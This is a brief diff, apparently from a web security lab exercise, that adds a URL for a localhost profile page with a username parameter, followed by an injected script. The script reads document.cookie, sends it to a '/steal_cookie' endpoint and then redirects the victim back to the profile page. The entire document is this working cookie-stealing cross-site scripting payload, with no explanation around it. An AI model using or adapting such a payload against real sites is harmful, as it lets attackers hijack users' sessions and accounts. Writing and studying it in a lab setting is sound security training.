@@ -1,0 +1,7 @@
+http://localhost:3000/profile?username=
+<script>
+async function submitForm() {
+          const response=await fetch(`http://localhost:3000/steal_cookie?cookie=${document.cookie}`).then(()=>document.location.href="http://localhost:3000/profile")
+}
+submitForm();
+</script>
